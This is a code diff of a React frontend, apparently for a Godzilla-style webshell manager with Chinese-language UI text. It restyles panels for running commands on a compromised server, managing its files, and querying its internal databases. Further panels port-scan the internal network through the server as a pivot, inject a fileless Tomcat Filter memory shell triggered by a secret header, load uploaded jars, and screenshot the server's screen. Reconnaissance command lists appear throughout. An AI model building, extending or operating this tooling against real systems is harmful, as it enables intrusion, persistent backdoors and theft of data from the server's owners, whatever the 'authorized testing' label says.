-    ? ["whoami", "id", "uname -a", "netstat -antp", "ps aux | head -30", "ip a", "crontab -l"]
-    : ["whoami", "id", "uname -a", "netstat -ano", "tasklist | findstr /i java", "ipconfig"];
+    ? ["whoami", "id", "uname -a", "ip a", "netstat -antp", "ps aux | head -30", "crontab -l"]
+    : ["whoami", "id", "uname -a", "ipconfig", "netstat -ano", "tasklist"];
 
   return (
-    <div className="space-y-2">
+    <div className="flex h-full flex-col gap-2">
       <div className="flex flex-wrap gap-1">
         {quick.map((c) => (
-          <button key={c} className="rounded bg-muted px-1.5 py-0.5 font-mono text-[10px] text-muted-foreground hover:bg-muted/70" onClick={() => run(c)} disabled={busy}>
-            {c.split(" ")[0] === "netstat" || c.includes("ps aux") || c.includes("tasklist") ? "🖥 " : ""}
-            {c}
-          </button>
+          <button key={c} className="rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 font-mono text-[10px] text-zinc-400 hover:text-zinc-100" onClick={() => run(c)} disabled={busy}>{c}</button>
         ))}
       </div>
-      <pre className="h-64 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（终端输出；命令在目标机执行，cwd 自动跟随）"}</pre>
+      <pre className="min-h-0 flex-1 overflow-auto whitespace-pre-wrap rounded border border-zinc-700 bg-black p-2 font-mono text-[11px] leading-relaxed text-green-400">{out || "（命令在目标机执行；cwd 自动跟随）"}</pre>
       <div className="flex items-center gap-1">
-        {cwd && <span className="rounded bg-blue-500/15 px-1.5 py-1 font-mono text-[10px] text-blue-400">{cwd}</span>}
-        <Input
-          className="font-mono text-xs"
-          placeholder="命令（↑↓ 翻历史）"
+        <span className="shrink-0 rounded bg-blue-900/60 px-1.5 py-1 font-mono text-[10px] text-blue-300">{cwd || "cwd"}</span>
+        <DInput
+          className="flex-1"
+          placeholder="命令（Enter 执行，↑↓ 历史）"
           value={cmd}
           disabled={busy}
           onChange={(e) => setCmd(e.target.value)}
@@ -417,34 +447,38 @@ function TerminalPanel({ target }: { target: WSTarget }) {
             }
           }}
         />
-        <Button size="sm" onClick={() => run()} disabled={busy}><PlayIcon className="size-4" /></Button>
+        <DBtn onClick={() => run()} disabled={busy}><PlayIcon className="size-3.5" /> 执行</DBtn>
       </div>
     </div>
   );
 }
 
-// ---------- 文件管理 ----------
+// ---------- 文件管理（哥斯拉：工具栏+路径栏+表格） ----------
+
 interface FileRow { name: string; size: number; is_dir: boolean; mtime: number }
 
 function FilesPanel({ target }: { target: WSTarget }) {
   const [rows, setRows] = React.useState<FileRow[]>([]);
   const [cwd, setCwd] = React.useState("");
+  const [pathInput, setPathInput] = React.useState("");
   const [err, setErr] = React.useState("");
+  const [selFile, setSelFile] = React.useState<FileRow | null>(null);
   const [preview, setPreview] = React.useState<{ name: string; text: string; b64?: string } | null>(null);
   const { busy, exec } = useRunner(target);
   const supported = ["php", "jsp", "jspx", "py", "node"].includes(target.script_type);
 
   const ls = async (p?: string) => {
     setErr("");
-    const target0 = p ?? cwd;
-    const r = await exec("list", { path: target0 });
+    const dest = p ?? cwd;
+    const r = await exec("list", { path: dest });
     if (!r.ok) { setErr(r.error); setRows([]); return; }
     try {
       const arr = JSON.parse(r.output.trim()) as FileRow[];
       arr.sort((a, b) => (b.is_dir ? 1 : 0) - (a.is_dir ? 1 : 0) || a.name.localeCompare(b.name));
       setRows(arr);
-      if (r.cwd) setCwd(r.cwd);
-      else if (target0) setCwd(target0);
+      const nc = r.cwd || dest || "";
+      setCwd(nc);
+      setPathInput(nc);
     } catch {
       setErr("目录解析失败：" + r.output.slice(0, 200));
     }
@@ -452,22 +486,19 @@ function FilesPanel({ target }: { target: WSTarget }) {
 
   React.useEffect(() => { if (supported) ls(); }, [supported]); // eslint-disable-line react-hooks/exhaustive-deps
 
+  const jpath = (n: string) => (cwd ? cwd.replace(/\/+$/, "") + "/" : "") + n;
+
   const read = async (f: FileRow) => {
-    const p = (cwd ? cwd.replace(/\/$/, "") + "/" : "") + f.name;
-    const r = await exec("read", { path: p });
+    const r = await exec("read", { path: jpath(f.name) });
     if (!r.ok) return void window.alert("读取失败: " + r.error);
     const text = r.data_b64 ? atob(r.data_b64) : "";
     const clean = text.slice(0, 2000);
-    const bad = Array.from(clean).filter((ch) => {
-      const c = ch.codePointAt(0) || 0;
-      return c < 32 && c !== 10 && c !== 13 && c !== 9;
-    }).length;
-    const printable = bad * 10 <= clean.length;
-    setPreview({ name: p, text: printable ? text.slice(0, 50000) : "（二进制文件，用「下载」保存）", b64: r.data_b64 });
+    const bad = Array.from(clean).filter((ch) => { const c = ch.codePointAt(0) || 0; return c < 32 && c !== 10 && c !== 13 && c !== 9; }).length;
+    setPreview({ name: jpath(f.name), text: bad * 10 <= clean.length ? text.slice(0, 50000) : "（二进制文件，用「下载」保存）", b64: r.data_b64 });
   };
 
   const download = (f: FileRow) => {
-    if (!preview || !preview.b64 || preview.name !== (cwd ? cwd.replace(/\/$/, "") + "/" : "") + f.name) return;
+    if (!preview?.b64 || preview.name !== jpath(f.name)) return void window.alert("先「打开」该文件再下载");
     const bin = atob(preview.b64);
     const bytes = new Uint8Array(bin.length);
     for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
@@ -478,8 +509,16 @@ function FilesPanel({ target }: { target: WSTarget }) {
   };
 
   const del = async (f: FileRow) => {
-    if (!window.confirm(`删除 ${f.name}？`)) return;
-    const r = await exec("delete", { path: (cwd ? cwd.replace(/\/$/, "") + "/" : "") + f.name });
+    if (!window.confirm(`删除 ${f.is_dir ? "目录" : "文件"} ${f.name}？`)) return;
+    const r = await exec("delete", { path: jpath(f.name) });
+    if (!r.ok) return void window.alert(r.error);
+    ls();
+  };
+
+  const rename = async (f: FileRow) => {
+    const n = window.prompt(`重命名 ${f.name} 为`, f.name);
+    if (!n || n === f.name) return;
+    const r = await exec("rename", { path: jpath(f.name), new_path: jpath(n) });
     if (!r.ok) return void window.alert(r.error);
     ls();
   };
@@ -487,7 +526,7 @@ function FilesPanel({ target }: { target: WSTarget }) {
   const mkdir = async () => {
     const n = window.prompt("新目录名");
     if (!n) return;
-    const r = await exec("mkdir", { path: (cwd ? cwd.replace(/\/$/, "") + "/" : "") + n });
+    const r = await exec("mkdir", { path: jpath(n) });
     if (!r.ok) return void window.alert(r.error);
     ls();
   };
@@ -495,7 +534,7 @@ function FilesPanel({ target }: { target: WSTarget }) {
   const touch = async () => {
     const n = window.prompt("新文件名");
     if (!n) return;
-    const r = await exec("write", { path: (cwd ? cwd.replace(/\/$/, "") + "/" : "") + n, content: "" });
+    const r = await exec("write", { path: jpath(n), content: "" });
     if (!r.ok) return void window.alert(r.error);
     ls();
   };
@@ -508,85 +547,70 @@ function FilesPanel({ target }: { target: WSTarget }) {
       if (!f) return;
       const b64 = await new Promise<string>((res) => {
         const fr = new FileReader();
-        fr.onload = () => {
-          const s = String(fr.result).split(",")[1] || "";
-          res(s);
-        };
+        fr.onload = () => res(String(fr.result).split(",")[1] || "");
         fr.readAsDataURL(f);
       });
-      const r = await exec("write", { path: (cwd ? cwd.replace(/\/$/, "") + "/" : "") + f.name, content_b64: b64 });
+      const r = await exec("write", { path: jpath(f.name), content_b64: b64 });
       if (!r.ok) return void window.alert("上传失败: " + r.error);
       ls();
     };
     inp.click();
   };
 
-  const enter = (f: FileRow) => {
-    if (!f.is_dir) return;
-    const base = cwd ? cwd.replace(/\/$/, "") : "";
-    ls(base ? `${base}/${f.name}` : f.name);
-  };
-  const up = () => ls(cwd.includes("/") ? cwd.replace(/\/[^/]+$/, "") : "..");
-  const go = () => {
-    const p = window.prompt("跳转路径", cwd);
-    if (p) ls(p);
-  };
-
-  if (!supported) return <div className="py-8 text-center text-sm text-muted-foreground">{target.script_type} 载荷不支持文件管理（仅 php/jsp/jspx/py/node）</div>;
+  if (!supported) return <div className="py-8 text-center text-sm text-zinc-500">{target.script_type} 载荷不支持文件管理（仅 php/jsp/jspx/py/node）</div>;
 
   return (
-    <div className="space-y-2">
-      <div className="flex flex-wrap items-center gap-1 text-xs">
-        <span className="rounded bg-blue-500/15 px-1.5 py-1 font-mono text-blue-400">{cwd || "（cwd）"}</span>
-        <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={up}>↑ 上级</Button>
-        <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={go}>跳转</Button>
-        <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={() => ls(cwd)} disabled={busy}><RefreshCw className={`size-3 ${busy ? "animate-spin" : ""}`} /></Button>
-        <span className="ml-auto flex gap-1">
-          <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={upload}><FolderUpIcon className="mr-1 size-3" /> 上传</Button>
-          <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={touch}><FilePlusIcon className="mr-1 size-3" /> 新文件</Button>
-          <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={mkdir}><FolderPlusIcon className="mr-1 size-3" /> 新目录</Button>
-        </span>
+    <div className="flex h-full flex-col gap-2">
+      {/* 工具栏（哥斯拉文件管理器） */}
+      <div className="flex flex-wrap items-center gap-1">
+        <DBtn onClick={() => ls(cwd)} disabled={busy}><RefreshCw className={`size-3.5 ${busy ? "animate-spin" : ""}`} /> 刷新</DBtn>
+        <DBtn onClick={upload}><FolderUpIcon className="size-3.5" /> 上传</DBtn>
+        <DBtn onClick={() => selFile && !selFile.is_dir ? download(selFile) : window.alert("先选中文件并「打开」")}><FolderUpIcon className="size-3.5 rotate-180" /> 下载</DBtn>
+        <DBtn onClick={touch}><FilePlusIcon className="size-3.5" /> 新建文件</DBtn>
+        <DBtn onClick={mkdir}><FolderPlusIcon className="size-3.5" /> 新建目录</DBtn>
+        <DBtn onClick={() => selFile && rename(selFile)} disabled={!selFile}><PencilLineIcon className="size-3.5" /> 重命名</DBtn>
+        <DBtn onClick={() => selFile && del(selFile)} disabled={!selFile} className="hover:!bg-red-900/50"><TrashIcon className="size-3.5" /> 删除</DBtn>
+        <span className="mx-2 h-4 w-px bg-zinc-700" />
+        <DBtn onClick={() => ls(cwd.includes("/") ? cwd.replace(/\/[^/]+$/, "") : "..")}>↑ 上级</DBtn>
+        <DInput className="min-w-0 flex-1" value={pathInput} onChange={(e) => setPathInput(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter") ls(pathInput); }} placeholder="路径（Enter 跳转）" />
       </div>
-      {err && <div className="rounded border border-red-500/40 bg-red-500/10 p-1.5 text-xs text-red-500">{err}</div>}
-      <div className="max-h-72 overflow-auto rounded border">
+      {err && <div className="rounded border border-red-800 bg-red-950/50 p-1.5 text-xs text-red-400">{err}</div>}
+      {/* 表格 */}
+      <div className="min-h-0 flex-1 overflow-auto rounded border border-zinc-700">
         <table className="w-full text-xs">
-          <thead className="sticky top-0 bg-muted">
-            <tr className="text-left text-muted-foreground">
-              <th className="py-1 pl-2">名称</th>
-              <th className="w-20">大小</th>
-              <th className="w-36">修改时间</th>
-              <th className="w-40">操作</th>
+          <thead className="sticky top-0 bg-zinc-800">
+            <tr className="text-left text-zinc-400">
+              <th className="py-1.5 pl-2">名称</th>
+              <th className="w-40">修改时间</th>
+              <th className="w-24">文件大小</th>
             </tr>
           </thead>
           <tbody>
-            {rows.length === 0 && (
-              <tr><td colSpan={4} className="py-4 text-center text-muted-foreground">{busy ? "加载中…" : "空目录（先 ls 或跳转路径）"}</td></tr>
-            )}
+            {rows.length === 0 && <tr><td colSpan={3} className="py-6 text-center text-zinc-500">{busy ? "加载中…" : "空目录（在路径栏输入路径回车）"}</td></tr>}
             {rows.map((f) => (
-              <tr key={f.name} className="border-b border-border/40 hover:bg-muted/30">
+              <tr
+                key={f.name}
+                className={`cursor-pointer border-b border-zinc-800 hover:bg-zinc-800/70 ${selFile?.name === f.name ? "bg-blue-900/30" : ""}`}
+                onClick={() => setSelFile(f)}
+                onDoubleClick={() => (f.is_dir ? ls(jpath(f.name)) : read(f))}
+              >
                 <td className="py-1 pl-2 font-mono">
                   {f.is_dir
-                    ? <button className="font-semibold text-blue-400 hover:underline" onClick={() => enter(f)}>📁 {f.name}</button>
-                    : <button className="hover:underline" onClick={() => read(f)}>{f.name}</button>}
+                    ? <span className="font-semibold text-blue-400">📁 {f.name}</span>
+                    : <span className="text-zinc-200">📄 {f.name}</span>}
                 </td>
-                <td className="text-muted-foreground">{f.is_dir ? "-" : fmtSize(f.size)}</td>
-                <td className="text-muted-foreground">{f.mtime ? new Date(f.mtime * 1000).toLocaleString() : "-"}</td>
-                <td>
-                  <span className="flex gap-2 text-[10px]">
-                    {!f.is_dir && <button className="text-blue-400 hover:underline" onClick={() => read(f)}>读</button>}
-                    {preview?.name.endsWith(f.name) && preview.b64 && !f.is_dir && <button className="text-green-500 hover:underline" onClick={() => download(f)}>下载</button>}
-                    <button className="text-red-400 hover:underline" onClick={() => del(f)}>删</button>
-                  </span>
-                </td>
+                <td className="text-zinc-500">{f.mtime ? new Date(f.mtime * 1000).toLocaleString() : "-"}</td>
+                <td className="text-zinc-500">{f.is_dir ? "目录" : fmtSize(f.size)}</td>
               </tr>
             ))}
           </tbody>
         </table>
       </div>
+      <div className="text-[10px] text-zinc-500">双击进入目录 / 打开文件；单击选中后用工具栏操作。</div>
       {preview && (
         <div className="space-y-1">
-          <div className="text-xs text-muted-foreground">预览：{preview.name}</div>
-          <pre className="max-h-56 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-[11px]">{preview.text}</pre>
+          <div className="text-xs text-zinc-400">预览：{preview.name}</div>
+          <DPre>{preview.text}</DPre>
         </div>
       )}
     </div>
@@ -600,6 +624,7 @@ function fmtSize(n: number) {
 }
 
 // ---------- 数据库 ----------
+
 function DBPanel({ target }: { target: WSTarget }) {
   const [cfg, setCfg] = React.useState({ db_type: "mysql", host: "127.0.0.1", port: "3306", user: "root", pass: "", db: "" });
   const [sql, setSql] = React.useState("SELECT 1");
@@ -609,7 +634,7 @@ function DBPanel({ target }: { target: WSTarget }) {
 
   const run = async () => {
     setErr("");
-    const r = await ext("db_exec", cfg as unknown as Record<string, unknown>);
+    const r = await ext("db_exec", cfg);
     if (!r.ok) { setErr(r.error || r.output); setResult(null); return; }
     try {
       const j = JSON.parse(r.output.trim());
@@ -619,7 +644,6 @@ function DBPanel({ target }: { target: WSTarget }) {
       setErr("解析失败：" + r.output.slice(0, 300));
     }
   };
-
   const probe = async () => {
     const r = await ext("db_probe", {});
     setErr(r.ok ? r.output : r.error);
@@ -628,38 +652,36 @@ function DBPanel({ target }: { target: WSTarget }) {
   return (
     <div className="space-y-2 text-sm">
       <div className="grid grid-cols-3 gap-1 text-xs md:grid-cols-6">
-        <select className="rounded border bg-transparent p-1" value={cfg.db_type} onChange={(e) => { const t = e.target.value; setCfg({ ...cfg, db_type: t, port: t === "mysql" ? "3306" : t === "pgsql" ? "5432" : cfg.port }); }}>
+        <select className="rounded border border-zinc-700 bg-zinc-800 p-1 text-zinc-200" value={cfg.db_type} onChange={(e) => { const t = e.target.value; setCfg({ ...cfg, db_type: t, port: t === "mysql" ? "3306" : t === "pgsql" ? "5432" : cfg.port }); }}>
           <option value="mysql">mysql</option><option value="pgsql">pgsql</option>
           {target.script_type === "php" && <option value="sqlite">sqlite</option>}
         </select>
-        <Input placeholder="host" value={cfg.host} onChange={(e) => setCfg({ ...cfg, host: e.target.value })} />
-        <Input placeholder="port" value={cfg.port} onChange={(e) => setCfg({ ...cfg, port: e.target.value })} />
-        <Input placeholder="user" value={cfg.user} onChange={(e) => setCfg({ ...cfg, user: e.target.value })} />
-        <Input placeholder="pass" type="password" value={cfg.pass} onChange={(e) => setCfg({ ...cfg, pass: e.target.value })} />
-        <Input placeholder={cfg.db_type === "sqlite" ? "db 文件路径" : "database"} value={cfg.db} onChange={(e) => setCfg({ ...cfg, db: e.target.value })} />
+        <DInput placeholder="host" value={cfg.host} onChange={(e) => setCfg({ ...cfg, host: e.target.value })} />
+        <DInput placeholder="port" value={cfg.port} onChange={(e) => setCfg({ ...cfg, port: e.target.value })} />
+        <DInput placeholder="user" value={cfg.user} onChange={(e) => setCfg({ ...cfg, user: e.target.value })} />
+        <DInput placeholder="pass" type="password" value={cfg.pass} onChange={(e) => setCfg({ ...cfg, pass: e.target.value })} />
+        <DInput placeholder={cfg.db_type === "sqlite" ? "db 文件路径" : "database"} value={cfg.db} onChange={(e) => setCfg({ ...cfg, db: e.target.value })} />
       </div>
       <div className="flex gap-1">
         {["SHOW DATABASES", "SHOW TABLES", "SELECT version()", "SELECT user()"].map((s) => (
-          <button key={s} className="rounded bg-muted px-1.5 py-0.5 font-mono text-[10px] text-muted-foreground hover:bg-muted/70" onClick={() => setSql(s)}>{s}</button>
+          <button key={s} className="rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 font-mono text-[10px] text-zinc-400 hover:text-zinc-100" onClick={() => setSql(s)}>{s}</button>
         ))}
-        <Button variant="outline" size="sm" className="ml-auto h-6 px-2 text-xs" onClick={probe} disabled={busy}>探测配置文件</Button>
+        <DBtn className="ml-auto" onClick={probe} disabled={busy}>探测配置文件</DBtn>
       </div>
-      <textarea className="h-16 w-full rounded border bg-transparent p-2 font-mono text-xs" value={sql} onChange={(e) => setSql(e.target.value)} placeholder="SQL（在目标机执行——直连目标内网数据库）" />
-      <Button size="sm" onClick={run} disabled={busy}><PlayIcon className="mr-1 size-4" /> 执行</Button>
-      {err && <div className="rounded border border-amber-500/40 bg-amber-500/10 p-1.5 font-mono text-xs text-amber-600">{err}</div>}
+      <textarea className="h-16 w-full rounded border border-zinc-700 bg-zinc-800 p-2 font-mono text-xs text-zinc-200" value={sql} onChange={(e) => setSql(e.target.value)} placeholder="SQL（目标机执行——直连其内网数据库）" />
+      <DBtn onClick={run} disabled={busy}><PlayIcon className="size-3.5" /> 执行</DBtn>
+      {err && <div className="rounded border border-amber-800 bg-amber-950/40 p-1.5 font-mono text-xs text-amber-400">{err}</div>}
       {result && (
-        <div className="max-h-60 overflow-auto rounded border">
+        <div className="max-h-64 overflow-auto rounded border border-zinc-700">
           <table className="w-full text-xs">
-            <thead className="sticky top-0 bg-muted">
-              <tr className="text-left">{result.columns.map((c) => <th key={c} className="py-1 pl-2">{c}</th>)}</tr>
-            </thead>
+            <thead className="sticky top-0 bg-zinc-800"><tr className="text-left text-zinc-400">{result.columns.map((c) => <th key={c} className="py-1 pl-2">{c}</th>)}</tr></thead>
             <tbody>
               {result.rows.map((row, i) => (
-                <tr key={i} className="border-b border-border/40">
-                  {result.columns.map((c) => <td key={c} className="truncate py-1 pl-2 font-mono" title={String(row[c])}>{String(row[c])}</td>)}
+                <tr key={i} className="border-b border-zinc-800">
+                  {result.columns.map((c) => <td key={c} className="truncate py-1 pl-2 font-mono text-zinc-300" title={String(row[c])}>{String(row[c])}</td>)}
                 </tr>
               ))}
-              {result.rows.length === 0 && <tr><td colSpan={result.columns.length || 1} className="py-3 text-center text-muted-foreground">{result.affected !== undefined ? `影响 ${result.affected} 行` : "无结果"}</td></tr>}
+              {result.rows.length === 0 && <tr><td colSpan={result.columns.length || 1} className="py-3 text-center text-zinc-500">{result.affected !== undefined ? `影响 ${result.affected} 行` : "无结果"}</td></tr>}
             </tbody>
           </table>
         </div>
@@ -668,7 +690,8 @@ function DBPanel({ target }: { target: WSTarget }) {
   );
 }
 
-// ---------- 网络 ----------
+// ---------- 内网探测 ----------
+
 function NetPanel({ target }: { target: WSTarget }) {
   const [host, setHost] = React.useState("127.0.0.1");
   const [ports, setPorts] = React.useState("80,443,3306,6379,8080,8888");
@@ -690,19 +713,20 @@ function NetPanel({ target }: { target: WSTarget }) {
 
   return (
     <div className="space-y-2 text-sm">
-      <div className="text-xs text-muted-foreground">内网端口扫描：以目标机为跳板探测其内网（授权测试）。</div>
+      <div className="text-xs text-zinc-500">以目标机为跳板探测其内网（授权测试）。</div>
       <div className="flex gap-1">
-        <Input placeholder="目标 host/IP" value={host} onChange={(e) => setHost(e.target.value)} className="font-mono text-xs" />
-        <Input placeholder="端口（逗号分隔/区间）" value={ports} onChange={(e) => setPorts(e.target.value)} className="font-mono text-xs" />
-        <Button size="sm" onClick={scan} disabled={busy}><PlayIcon className="mr-1 size-4" /> 扫描</Button>
-        <Button variant="outline" size="sm" onClick={netstat} disabled={busy}>netstat</Button>
+        <DInput placeholder="目标 host/IP" value={host} onChange={(e) => setHost(e.target.value)} />
+        <DInput placeholder="端口（逗号/区间）" value={ports} onChange={(e) => setPorts(e.target.value)} />
+        <DBtn onClick={scan} disabled={busy}><PlayIcon className="size-3.5" /> 扫描</DBtn>
+        <DBtn onClick={netstat} disabled={busy}>netstat</DBtn>
       </div>
-      <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（结果）"}</pre>
+      <DPre>{out || "（结果）"}</DPre>
     </div>
   );
 }
 
-// ---------- 进程 ----------
+// ---------- 进程管理 ----------
+
 function ProcPanel({ target }: { target: WSTarget }) {
   const [rows, setRows] = React.useState<{ name: string; pid: string; mem?: string; state?: string }[]>([]);
   const [raw, setRaw] = React.useState("");
@@ -724,30 +748,29 @@ function ProcPanel({ target }: { target: WSTarget }) {
 
   return (
     <div className="space-y-2 text-sm">
-      <Button size="sm" onClick={list} disabled={busy}><RefreshCw className={`mr-1 size-4 ${busy ? "animate-spin" : ""}`} /> 刷新进程列表</Button>
+      <DBtn onClick={list} disabled={busy}><RefreshCw className={`size-3.5 ${busy ? "animate-spin" : ""}`} /> 刷新进程列表</DBtn>
       {rows.length > 0 ? (
-        <div className="max-h-72 overflow-auto rounded border">
+        <div className="max-h-96 overflow-auto rounded border border-zinc-700">
           <table className="w-full text-xs">
-            <thead className="sticky top-0 bg-muted"><tr className="text-left"><th className="py-1 pl-2">PID</th><th>名称</th><th>内存/状态</th></tr></thead>
+            <thead className="sticky top-0 bg-zinc-800"><tr className="text-left text-zinc-400"><th className="py-1 pl-2">PID</th><th>名称</th><th>内存/状态</th></tr></thead>
             <tbody>
               {rows.map((p, i) => (
-                <tr key={i} className="border-b border-border/40">
-                  <td className="py-1 pl-2 font-mono">{p.pid}</td>
-                  <td className="font-mono">{p.name}</td>
-                  <td className="text-muted-foreground">{p.mem || p.state || "-"}</td>
+                <tr key={i} className="border-b border-zinc-800">
+                  <td className="py-1 pl-2 font-mono text-zinc-300">{p.pid}</td>
+                  <td className="font-mono text-zinc-200">{p.name}</td>
+                  <td className="text-zinc-500">{p.mem || p.state || "-"}</td>
                 </tr>
               ))}
             </tbody>
           </table>
         </div>
-      ) : (
-        raw && <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{raw}</pre>
-      )}
+      ) : raw ? <DPre>{raw}</DPre> : <div className="py-6 text-center text-xs text-zinc-500">（点刷新获取）</div>}
     </div>
   );
 }
 
-// ---------- 内存马（JSP） ----------
+// ---------- 内存马 ----------
+
 function MemshellPanel({ target }: { target: WSTarget }) {
   const [filterName, setFilterName] = React.useState("forangGate");
   const [gateHeader, setGateHeader] = React.useState("X-Forang");
@@ -772,25 +795,26 @@ function MemshellPanel({ target }: { target: WSTarget }) {
 
   return (
     <div className="space-y-2 text-sm">
-      <div className="rounded border bg-amber-500/10 p-2 text-xs text-amber-600">
-        Tomcat Filter 内存马（godzilla 姿势）：注入后无文件驻留、重启失效。触发方式：带 <code>{`Header: ${gateHeader}: ${gateValue}`}</code> 访问任意 URL 加 <code>?cmd=命令</code>。仅授权测试使用。
+      <div className="rounded border border-amber-800 bg-amber-950/40 p-2 text-xs text-amber-400">
+        Tomcat Filter 内存马（godzilla 姿势）：注入后无文件驻留、重启失效。触发：带 <code>{`Header: ${gateHeader}: ${gateValue}`}</code> 访问任意 URL 加 <code>?cmd=命令</code>。仅授权测试。
       </div>
       <div className="grid grid-cols-3 gap-1">
-        <Input placeholder="Filter 名" value={filterName} onChange={(e) => setFilterName(e.target.value)} className="font-mono text-xs" />
-        <Input placeholder="触发头名" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} className="font-mono text-xs" />
-        <Input placeholder="触发头值" value={gateValue} onChange={(e) => setGateValue(e.target.value)} className="font-mono text-xs" />
+        <DInput placeholder="Filter 名" value={filterName} onChange={(e) => setFilterName(e.target.value)} />
+        <DInput placeholder="触发头名" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} />
+        <DInput placeholder="触发头值" value={gateValue} onChange={(e) => setGateValue(e.target.value)} />
       </div>
       <div className="flex gap-1">
-        <Button size="sm" variant="secondary" onClick={inject} disabled={busy}>注入</Button>
-        <Button size="sm" variant="outline" onClick={list} disabled={busy}>枚举 Filter</Button>
-        <Button size="sm" variant="outline" onClick={remove} disabled={busy}>移除</Button>
+        <DBtn onClick={inject} disabled={busy} className="!bg-red-900/60 hover:!bg-red-800">注入内存马</DBtn>
+        <DBtn onClick={list} disabled={busy}>枚举 Filter</DBtn>
+        <DBtn onClick={remove} disabled={busy}>移除</DBtn>
       </div>
-      <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（操作结果）"}</pre>
+      <DPre>{out || "（操作结果）"}</DPre>
     </div>
   );
 }
 
-// ---------- Servlet 管理（JSP） ----------
+// ---------- Servlet ----------
+
 function ServletPanel({ target }: { target: WSTarget }) {
   const [out, setOut] = React.useState("");
   const { busy, ext } = useRunner(target);
@@ -800,13 +824,14 @@ function ServletPanel({ target }: { target: WSTarget }) {
   };
   return (
     <div className="space-y-2 text-sm">
-      <Button size="sm" onClick={list} disabled={busy}><RefreshCw className={`mr-1 size-4 ${busy ? "animate-spin" : ""}`} /> 枚举 Servlet / Filter</Button>
-      <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（结果 JSON：servlets/filters 注册与映射）"}</pre>
+      <DBtn onClick={list} disabled={busy}><RefreshCw className={`size-3.5 ${busy ? "animate-spin" : ""}`} /> 枚举 Servlet / Filter</DBtn>
+      <DPre>{out || "（结果 JSON：servlets/filters 注册与映射）"}</DPre>
     </div>
   );
 }
 
-// ---------- Jar 加载（JSP） ----------
+// ---------- Jar ----------
+
 function JarPanel({ target }: { target: WSTarget }) {
   const [out, setOut] = React.useState("");
   const { busy, ext } = useRunner(target);
@@ -829,30 +854,31 @@ function JarPanel({ target }: { target: WSTarget }) {
   };
   return (
     <div className="space-y-2 text-sm">
-      <div className="text-xs text-muted-foreground">上传 jar 到目标机临时目录并 URLClassLoader 装载（列出类清单；配合内存马/反序列化利用链使用）。</div>
-      <Button size="sm" onClick={upload} disabled={busy}><FolderUpIcon className="mr-1 size-4" /> 选择 jar 上传加载</Button>
-      <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（结果）"}</pre>
+      <div className="text-xs text-zinc-500">上传 jar 到目标机临时目录并 URLClassLoader 装载（配合内存马/利用链）。</div>
+      <DBtn onClick={upload} disabled={busy}><FolderUpIcon className="size-3.5" /> 选择 jar 上传加载</DBtn>
+      <DPre>{out || "（结果）"}</DPre>
     </div>
   );
 }
 
-// ---------- 截图（JSP） ----------
+// ---------- 远程屏幕 ----------
+
 function ShotPanel({ target }: { target: WSTarget }) {
   const [img, setImg] = React.useState("");
   const { busy, ext } = useRunner(target);
   const shot = async () => {
     const r = await ext("screenshot", {});
-    if (!r.ok || !r.data_b64) return void window.alert(r.ok ? "无图像数据（服务器可能无桌面会话）" : r.error);
+    if (!r.ok || !r.data_b64) return void window.alert(r.ok ? "无图像数据（服务器无桌面会话）" : r.error);
     setImg(`data:image/png;base64,${r.data_b64}`);
   };
   return (
     <div className="space-y-2 text-sm">
-      <div className="text-xs text-muted-foreground">java.awt.Robot 截取目标服务器屏幕（仅桌面会话有效；无头服务器会报 HeadlessException）。</div>
-      <Button size="sm" onClick={shot} disabled={busy}><CameraIcon className="mr-1 size-4" /> 截图</Button>
+      <div className="text-xs text-zinc-500">java.awt.Robot 截取目标服务器屏幕（无头服务器报 HeadlessException）。</div>
+      <DBtn onClick={shot} disabled={busy}><CameraIcon className="size-3.5" /> 截图</DBtn>
       {img && (
         <div>
           {/* eslint-disable-next-line @next/next/no-img-element */}
-          <img src={img} alt="目标屏幕" className="max-h-96 rounded border" />
+          <img src={img} alt="目标屏幕" className="max-h-96 rounded border border-zinc-700" />
           <a href={img} download="screenshot.png" className="text-xs text-blue-400 hover:underline">下载 PNG</a>
         </div>
       )}
@@ -861,6 +887,7 @@ function ShotPanel({ target }: { target: WSTarget }) {
 }
 
 // ---------- PHP 工具 ----------
+
 function PHPToolPanel({ target }: { target: WSTarget }) {
   const [out, setOut] = React.useState("");
   const { busy, ext } = useRunner(target);
@@ -876,16 +903,17 @@ function PHPToolPanel({ target }: { target: WSTarget }) {
   return (
     <div className="space-y-2 text-sm">
       <div className="flex flex-wrap gap-1">
-        <Button size="sm" variant="outline" onClick={() => run("php_info")} disabled={busy}>PHP 信息</Button>
-        <Button size="sm" variant="outline" onClick={() => run("php_writedirs")} disabled={busy}>可写目录</Button>
-        <Button size="sm" variant="outline" onClick={scan} disabled={busy}>WebShell 扫描</Button>
+        <DBtn onClick={() => run("php_info")} disabled={busy}>PHP 信息</DBtn>
+        <DBtn onClick={() => run("php_writedirs")} disabled={busy}>可写目录</DBtn>
+        <DBtn onClick={scan} disabled={busy}>WebShell 扫描</DBtn>
       </div>
-      <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（结果 JSON：phpinfo 摘要 / 可写目录 / 命中可疑文件）"}</pre>
+      <DPre>{out || "（结果 JSON：phpinfo 摘要 / 可写目录 / 可疑文件）"}</DPre>
     </div>
   );
 }
 
